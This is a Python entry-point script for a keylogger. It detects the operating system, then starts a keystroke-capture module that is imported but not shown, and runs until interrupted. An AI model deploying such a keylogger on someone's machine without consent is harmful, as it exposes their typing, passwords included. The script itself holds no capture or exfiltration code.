from core.os_detector.os_detector import OSDetector
from core.key_capture.key_capture_module import KeyCaptureModule


def main():
    """
    Main function to run the keylogger based on the detected operating system.
    """
    try:
        detector = OSDetector()
        os_type = detector.detect_os()
        print(f"The detected operating system is: {os_type}")

        key_capture = KeyCaptureModule(os_type)
        key_capture.start_capture()

        # The key capturing will run in the background. To see it in action,
        # keep this script running and type something. Use Ctrl+C in the terminal to stop.
        while True:
            pass
    except KeyboardInterrupt:
        key_capture.stop_capture()
    except Exception as e:
        print(f"Error in main: {e}")


if __name__ == "__main__":
    main()
